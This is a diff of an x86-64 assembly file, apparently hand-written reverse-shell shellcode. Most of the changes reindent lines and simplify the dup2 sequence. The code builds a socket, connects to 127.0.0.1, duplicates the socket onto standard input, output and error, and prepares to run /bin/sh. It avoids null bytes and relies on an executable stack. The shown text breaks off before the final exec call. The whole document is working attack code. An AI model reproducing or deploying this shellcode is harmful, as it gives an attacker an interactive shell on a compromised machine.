@@ -2,23 +2,23 @@
 
 .text
 _start:
-	jmp next
+    jmp next
 sh:
     .ascii "/bin/sh"
 eol:
     .byte 0xff
 sockaddr:
     #AF_INET
-	.byte 2
-	.byte 0xff
-	.word 4391
+    .byte 2
+    .byte 0xff
+    .word 4391
     .long 0xffffffff
-	.byte 127
-	.byte 0
-	.byte 0
-	.byte 1
+    .byte 127
+    .byte 0
+    .byte 0
+    .byte 1
 next:
-	# socket(AF_INET, SOCK_STREAM, 0)
+    # socket(AF_INET, SOCK_STREAM, 0)
     # sys_socket
     xorl %eax, %eax
     movb $41, %al
@@ -34,46 +34,43 @@ next:
     xorl %edx, %edx
     syscall
 
-	# connect(fd, &sockaddr, 16)
-	# it could be assumed that the fd is less than 2 bytes long
-	# move the socket to first argument
-	movl %eax, %edi
-	# sys_connect
-	xorl %eax, %eax
-	movb $42, %al
-	leaq sockaddr(%rip), %rsi
-	xorl %edx, %edx
+    # connect(fd, &sockaddr, 16)
+    # it could be assumed that the fd is less than 2 bytes long
+    # move the socket to first argument
+    movl %eax, %edi
+    # sys_connect
+    xorl %eax, %eax
+    movb $42, %al
+    leaq sockaddr(%rip), %rsi
+    xorl %edx, %edx
     # put zeroes in sockaddr
     movq %rsi, %r8
     inc %r8
     movb %dl, (%r8)
     addq $3, %r8
     movl %edx, (%r8)
-	# sizof(struct sockaddr)
-	movb $16, %dl
+    # sizof(struct sockaddr)
+    movb $16, %dl
 
-	syscall
-	# at this point rax could be -111 (connection refused)
+    syscall
+    # at this point rax could be -111 (connection refused)
 
-	# dupd2(fd, 0)
-	xorl %esi, %esi
-	xorb %sil, %sil
-    # movb $0, %sil
+    # dupd2(fd, 0)
+    xorl %esi, %esi
+    # sys_dup2
+    xorl %eax, %eax
+    movb $33, %al
+    syscall
 
-	# sys_dup2
-	xorl %eax, %eax
-	movb $33, %al
-	syscall
+    movb $1, %sil
+    xorl %eax, %eax
+    movb $33, %al
+    syscall
 
-	movb $1, %sil
-	xorl %eax, %eax
-	movb $33, %al
-	syscall
-
-	movb $2, %sil
-	xorl %eax, %eax
-	movb $33, %al
-	syscall
+    movb $2, %sil
+    xorl %eax, %eax
+    movb $33, %al
+    syscall
 
     xorl %eax, %eax
     # stack is executable, i can do this
